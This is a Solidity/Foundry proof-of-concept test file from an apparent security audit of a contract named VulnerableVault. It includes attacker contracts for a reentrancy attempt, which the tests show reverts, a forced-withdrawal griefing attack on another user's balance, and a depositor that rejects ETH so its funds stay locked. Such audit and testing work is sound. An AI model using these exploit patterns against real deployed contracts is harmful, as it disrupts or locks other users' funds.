// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {VulnerableVault} from "../src/VulnerableVault.sol";

// -----------------------------------------------------------------------------
// SENTINEL POC - VulnerableVault Security Property Tests
// -----------------------------------------------------------------------------
//
// This file is the canonical Sentinel PoC for the VulnerableVault audit.
// It covers three distinct security properties:
//
//  1. REENTRANCY DRAIN CLAIM (REJECTED_DEMOTED):
//     Proves that pure reentrancy on withdraw() cannot produce attacker_net_gain > 0.
//     Solidity 0.8 checked arithmetic causes underflow on the unwind stack -> revert.
//
//  2. ACCESS CONTROL - FORCED WITHDRAWAL GRIEFING (CONFIRMED High):
//     Proves that any caller can force-withdraw any user's vault balance to that
//     user's address. The caller gains nothing, but the victim's vault state is
//     disrupted without consent. For ETH-rejecting contract depositors, this
//     permanently locks their funds (DoS).
//
//  3. ACCESS CONTROL - PERMANENT FUND LOCK DoS (CONFIRMED High):
//     Proves that a contract depositor whose receive() reverts has its funds
//     permanently locked: neither a third party nor the victim itself can withdraw.
//
// Conservation invariant checked throughout:
//   sum(vault.balances) + vault.ETH_balance == constant (no ETH created or destroyed)
// -----------------------------------------------------------------------------

// --- Attacker contracts -------------------------------------------------------

/// @notice Attempts pure reentrancy: re-enters withdraw(self, amount) in receive().
///         Expected outcome: REVERT due to Solidity 0.8 underflow on unwind.
contract ReentrantDrainAttacker {
    VulnerableVault public vault;
    uint256 public depth;
    uint256 public ethReceivedFromVault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack(uint256 amount) external {
        depth = 0;
        ethReceivedFromVault = 0;
        vault.withdraw(payable(address(this)), amount);
    }

    receive() external payable {
        ethReceivedFromVault += msg.value;
        depth++;
        if (depth < 5) {
            // Attempt to re-enter: balances[this] not yet decremented
            vault.withdraw(payable(address(this)), 1 ether);
        }
    }
}

/// @notice Demonstrates forced-withdrawal griefing: caller forces victim's ETH
///         to be sent to victim's address without victim's consent.
///         Caller gains nothing. Victim's vault state is disrupted.
contract ForcedWithdrawalGriefingAttacker {
    VulnerableVault public vault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    /// @notice Force-withdraw victim's balance to victim's address.
    ///         msg.sender (this contract) gains 0 ETH.
    function forceWithdraw(address payable victim, uint256 amount) external {
        vault.withdraw(victim, amount);
    }

    receive() external payable {}
}

/// @notice A contract depositor that rejects all ETH transfers.
///         Demonstrates permanent fund lock when combined with the access control bug.
contract ETHRejectingDepositor {
    VulnerableVault public vault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function deposit() external payable {
        vault.deposit{value: msg.value}();
    }

    // Explicitly rejects ETH - simulates a multisig or protocol contract
    // that does not have a payable fallback.
    receive() external payable {
        revert("ETH not accepted");
    }
}

// --- Test suite ---------------------------------------------------------------

contract SentinelPoCTest is Test {
    VulnerableVault public vault;
    address payable public alice;
    address payable public bob;

    function setUp() public {
        vault = new VulnerableVault();

        alice = payable(makeAddr("alice"));
        bob   = payable(makeAddr("bob"));

        // Alice deposits 10 ETH - victim funds
        vm.deal(alice, 10 ether);
        vm.prank(alice);
        vault.deposit{value: 10 ether}();

        // Bob deposits 5 ETH - second victim
        vm.deal(bob, 5 ether);
        vm.prank(bob);
        vault.deposit{value: 5 ether}();

        assertEq(address(vault).balance, 15 ether, "setUp: vault holds 15 ETH");
        assertEq(vault.balances(alice), 10 ether,  "setUp: alice credited 10 ETH");
        assertEq(vault.balances(bob),   5 ether,   "setUp: bob credited 5 ETH");
    }

    // -------------------------------------------------------------------------
    // POC 1: REENTRANCY DRAIN - attacker_net_gain > 0 CANNOT be proven
    //
    // Security property: attacker_net_gain = ETH_received_from_vault - ETH_deposited <= 0
    //
    // This test PROVES the reentrancy drain claim is FALSE for this vault.
    // The entire transaction reverts due to Solidity 0.8 underflow on the
    // unwind stack when balances[attacker] goes below zero.
    // -------------------------------------------------------------------------
    function testPoC1_ReentrancyDrain_NetGainIsZero_PureReentrancyReverts() public {
        console2.log("=== POC 1: REENTRANCY DRAIN CLAIM ===");

        ReentrantDrainAttacker attacker = new ReentrantDrainAttacker(vault);

        // Fund attacker with exactly 1 ETH and deposit it - no leftover raw balance
        vm.deal(address(attacker), 1 ether);
        vm.prank(address(attacker));
        vault.deposit{value: 1 ether}();

        // Verify: attacker raw balance == 0 (all ETH deposited, no leftover)
        assertEq(address(attacker).balance, 0,       "Pre-attack: attacker raw balance == 0 (no leftover)");
        assertEq(vault.balances(address(attacker)), 1 ether, "Pre-attack: attacker vault credit == 1 ETH");

        uint256 vaultBalanceBefore = address(vault).balance; // 16 ETH
        console2.log("Pre-attack vault ETH:             ", vaultBalanceBefore);
        console2.log("Pre-attack attacker raw balance:  ", address(attacker).balance);
        console2.log("Pre-attack attacker vault credit: ", vault.balances(address(attacker)));

        // The attack MUST revert - Solidity 0.8 underflow on unwind stack
        // when balances[attacker] -= 1 ether fires more times than deposited
        vm.expectRevert();
        attacker.attack(1 ether);

        // State is completely unchanged - no ETH extracted
        assertEq(address(attacker).balance, 0,       "Post-revert: attacker extracted 0 ETH");
        assertEq(vault.balances(address(attacker)), 1 ether, "Post-revert: attacker vault credit unchanged");
        assertEq(address(vault).balance, vaultBalanceBefore, "Post-revert: vault balance unchanged");

        // Conservation: total ETH in system unchanged
        assertEq(address(vault).balance, 16 ether, "Conservation: vault holds 16 ETH (unchanged)");

        console2.log("CONFIRMED: Pure reentrancy reverts. attacker_net_gain = 0.");
        console2.log("VERDICT: Reentrancy drain claim REJECTED_DEMOTED.");
        console2.log("         Same-recipient + Solidity 0.8 underflow guard blocks theft.");
    }

    // -------------------------------------------------------------------------
    // POC 2: ACCESS CONTROL - FORCED WITHDRAWAL GRIEFING
    //
    // Security property: any unprivileged caller can force-withdraw any user's
    // vault balance to that user's address without authorization.
    //
    // Impact: caller gains 0 ETH (not theft), but victim's vault state is
    // disrupted without consent. For EOA victims, ETH is returned to them.
    // For contract victims that reject ETH, funds are permanently locked.
    //
    // This test CONFIRMS the access control vulnerability.
    // -------------------------------------------------------------------------
    function testPoC2_AccessControl_ForcedWithdrawal_GriefingNotTheft() public {
        console2.log("=== POC 2: ACCESS CONTROL - FORCED WITHDRAWAL GRIEFING ===");

        ForcedWithdrawalGriefingAttacker griefingCaller = new ForcedWithdrawalGriefingAttacker(vault);

        // griefingCaller has no vault balance - pure attacker with 0 deposits
        assertEq(vault.balances(address(griefingCaller)), 0, "Griefing caller has 0 vault balance");
        assertEq(address(griefingCaller).balance, 0,         "Griefing caller has 0 raw ETH");

        uint256 aliceVaultBefore = vault.balances(alice);
        uint256 aliceRawBefore   = alice.balance;

        console2.log("Pre-grief alice vault credit:     ", aliceVaultBefore);
        console2.log("Pre-grief alice raw balance:      ", aliceRawBefore);
        console2.log("Pre-grief griefingCaller balance: ", address(griefingCaller).balance);

        // griefingCaller force-withdraws alice's entire balance to alice's address
        // No authorization check - this succeeds without alice's consent
        griefingCaller.forceWithdraw(alice, 10 ether);

        console2.log("Post-grief alice vault credit:    ", vault.balances(alice));
        console2.log("Post-grief alice raw balance:     ", alice.balance);
        console2.log("Post-grief griefingCaller balance:", address(griefingCaller).balance);

        // Alice's vault credit is zeroed - state disrupted without consent
        assertEq(vault.balances(alice), 0,        "Alice vault credit force-zeroed without consent");
        // Alice received her own ETH back (not stolen - returned to rightful owner)
        assertEq(alice.balance, 10 ether,         "Alice received her own ETH (not stolen by caller)");
        // griefingCaller gained NOTHING - this is griefing, not theft
        assertEq(address(griefingCaller).balance, 0, "Griefing caller net gain == 0 (not theft)");

        // Conservation: ETH moved from vault to alice (rightful owner), not to attacker
        assertEq(address(vault).balance, 5 ether, "Vault: only bob's 5 ETH remains");

        // SECURITY PROPERTY: caller_net_gain = 0 (griefing, not theft)
        int256 callerNetGain = int256(address(griefingCaller).balance) - int256(0); // deposited 0
        assertEq(callerNetGain, 0, "GRIEFING CONFIRMED: caller_net_gain == 0 (not theft)");

        console2.log("CONFIRMED: Forced withdrawal is griefing/DoS, not theft.");
        console2.log("VERDICT: Access control bug CONFIRMED as High severity (forced state change).");
    }

    // -------------------------------------------------------------------------
    // POC 3: ACCESS CONTROL - PERMANENT FUND LOCK (DoS)
    //
    // Security property: a contract depositor whose receive() reverts has its
    // funds permanently locked in the vault. Neither a third party nor the
    // victim itself can withdraw.
    //
    // This is the most severe reachable impact of the access control bug.
    // -------------------------------------------------------------------------
    function testPoC3_AccessControl_PermanentFundLock_DoS() public {
        console2.log("=== POC 3: PERMANENT FUND LOCK DoS ===");

        ETHRejectingDepositor victim = new ETHRejectingDepositor(vault);

        // Victim (e.g., a multisig or protocol contract) deposits 3 ETH
        vm.deal(address(victim), 3 ether);
        vm.prank(address(victim));
        vault.deposit{value: 3 ether}();

        assertEq(vault.balances(address(victim)), 3 ether, "Victim credited 3 ETH");
        assertEq(address(vault).balance, 18 ether,         "Vault holds 18 ETH");

        console2.log("Victim vault credit:  ", vault.balances(address(victim)));
        console2.log("Victim raw balance:   ", address(victim).balance);

        // Attempt 1: Third party tries to force-withdraw victim's ETH
        // vault.withdraw calls victim.receive() which reverts -> entire tx reverts
        address griefingCaller = makeAddr("griefingCaller");
        vm.prank(griefingCaller);
        vm.expectRevert();
        vault.withdraw(payable(address(victim)), 1 ether);

        // Attempt 2: Victim tries to withdraw its own funds
        // Same result: victim.receive() reverts -> victim cannot access its own ETH
        vm.prank(address(victim));
        vm.expectRevert();
        vault.withdraw(payable(address(victim)), 1 ether);

        // Funds permanently locked - victim cannot recover ETH
        assertEq(vault.balances(address(victim)), 3 ether, "Victim vault credit unchanged - funds LOCKED");
        assertEq(address(victim).balance, 0,               "Victim raw balance == 0 - ETH stuck in vault");
        assertEq(address(vault).balance, 18 ether,         "Vault balance unchanged - ETH permanently locked");

        console2.log("CONFIRMED: ETH-rejecting contract depositor has funds permanently locked.");
        console2.log("VERDICT: Permanent fund lock DoS CONFIRMED as High severity.");
    }

    // -------------------------------------------------------------------------
    // POC 4: CONSERVATION INVARIANT - full system balance check
    //
    // Verifies that no ETH is created or destroyed across all operations.
    // -------------------------------------------------------------------------
    function testPoC4_ConservationInvariant() public {
        // Total ETH in system = vault balance + all user raw balances
        // Initial: vault=15, alice=0, bob=0
        uint256 totalETH = address(vault).balance + alice.balance + bob.balance;
        assertEq(totalETH, 15 ether, "Conservation: total ETH == 15 ETH");

        // Alice withdraws her own funds (authorized)
        vm.prank(alice);
        vault.withdraw(alice, 5 ether);

        // Conservation holds: ETH moved from vault to alice
        uint256 totalETHAfter = address(vault).balance + alice.balance + bob.balance;
        assertEq(totalETHAfter, 15 ether, "Conservation: total ETH unchanged after withdrawal");
        assertEq(address(vault).balance, 10 ether, "Vault: 10 ETH remains");
        assertEq(alice.balance, 5 ether,            "Alice: received 5 ETH");

        console2.log("CONFIRMED: Conservation invariant holds. No ETH created or destroyed.");
    }
}
